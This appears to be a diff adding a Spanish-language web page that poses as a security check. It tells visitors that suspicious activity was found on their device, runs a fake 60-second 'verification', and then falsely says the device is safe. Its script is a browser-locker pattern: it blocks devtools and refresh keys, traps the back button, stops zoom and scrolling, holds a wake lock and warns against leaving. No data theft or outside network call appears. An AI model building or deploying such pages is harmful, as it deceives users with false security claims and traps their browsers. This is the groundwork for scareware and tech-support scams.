@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verificación de Seguridad</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+        .security-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .security-icon {
+            font-size: 4rem;
+            color: #ff6b6b;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        .security-title {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #ff6b6b;
+        }
+
+        .security-message {
+            font-size: 1.1rem;
+            line-height: 1.5;
+            margin-bottom: 30px;
+            max-width: 350px;
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #4CAF50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        .loading-text {
+            font-size: 1rem;
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            width: 250px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            width: 0%;
+            animation: progress 60s linear forwards;
+        }
+
+        .timer {
+            font-size: 0.9rem;
+            color: #ccc;
+            margin-top: 10px;
+        }
+
+        .warning-text {
+            font-size: 0.8rem;
+            color: #ffeb3b;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        /* Prevenir zoom y scroll */
+        html, body {
+            touch-action: none;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Ocultar elementos del navegador en Android */
+        @media screen and (max-width: 768px) {
+            body {
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                appearance: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="security-overlay" id="securityOverlay">
+        <div class="security-icon">🛡️</div>
+        <div class="security-title">ALERTA DE SEGURIDAD</div>
+        <div class="security-message">
+            Se ha detectado actividad sospechosa en tu dispositivo. 
+            Por favor, mantén la pantalla activa mientras verificamos tu seguridad.
+        </div>
+        
+        <div class="loading-container">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Verificando seguridad...</div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="timer">
+                Tiempo restante: <span id="countdown">60</span> segundos
+            </div>
+        </div>
+        
+        <div class="warning-text">
+            ⚠️ NO CIERRES ESTA VENTANA DURANTE EL PROCESO ⚠️
+        </div>
+    </div>
+
+    <script>
+        // Prevenir acciones del usuario
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            // Bloquear teclas comunes
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                (e.ctrlKey && e.key === 'u') ||
+                e.key === 'Escape' ||
+                e.key === 'F5' ||
+                (e.ctrlKey && e.key === 'r')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Prevenir el botón atrás del navegador
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+
+        // Mantener la pantalla activa
+        let wakeLock = null;
+
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                }
+            } catch (err) {
+                console.log('Wake Lock no disponible');
+            }
+        }
+
+        // Contador regresivo
+        let timeLeft = 60;
+        const countdownElement = document.getElementById('countdown');
+        
+        const timer = setInterval(function() {
+            timeLeft--;
+            countdownElement.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                // Aquí puedes agregar lo que sucede después del minuto
+                showCompletionMessage();
+            }
+        }, 1000);
+
+        function showCompletionMessage() {
+            const overlay = document.getElementById('securityOverlay');
+            overlay.innerHTML = `
+                <div class="security-icon" style="color: #4CAF50;">✅</div>
+                <div class="security-title" style="color: #4CAF50;">VERIFICACIÓN COMPLETADA</div>
+                <div class="security-message">
+                    Tu dispositivo ha sido verificado exitosamente. 
+                    Ahora puedes continuar navegando de forma segura.
+                </div>
+                <button onclick="closeSecurityScreen()" style="
+                    background: #4CAF50;
+                    color: white;
+                    border: none;
+                    padding: 15px 30px;
+                    border-radius: 25px;
+                    font-size: 1rem;
+                    margin-top: 20px;
+                    cursor: pointer;
+                ">Continuar</button>
+            `;
+        }
+
+        function closeSecurityScreen() {
+            document.getElementById('securityOverlay').style.display = 'none';
+            document.body.style.overflow = 'auto';
+            document.body.style.position = 'static';
+            
+            // Liberar wake lock
+            if (wakeLock) {
+                wakeLock.release();
+            }
+        }
+
+        // Prevenir zoom con gestos
+        document.addEventListener('touchstart', function(e) {
+            if (e.touches.length > 1) {
+                e.preventDefault();
+            }
+        });
+
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(e) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                e.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+
+        // Prevenir scroll
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        // Inicializar wake lock al cargar
+        window.addEventListener('load', function() {
+            requestWakeLock();
+        });
+
+        // Mostrar alerta si el usuario intenta salir
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = 'La verificación de seguridad está en proceso. ¿Estás seguro de que quieres salir?';
+            return e.returnValue;
+        });
+
+        // Detectar cuando la página pierde el foco
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                // Opcional: mostrar notificación o alerta
+                console.log('Usuario intentó cambiar de pestaña/app');
+            }
+        });
+    </script>
+</body>
+</html>
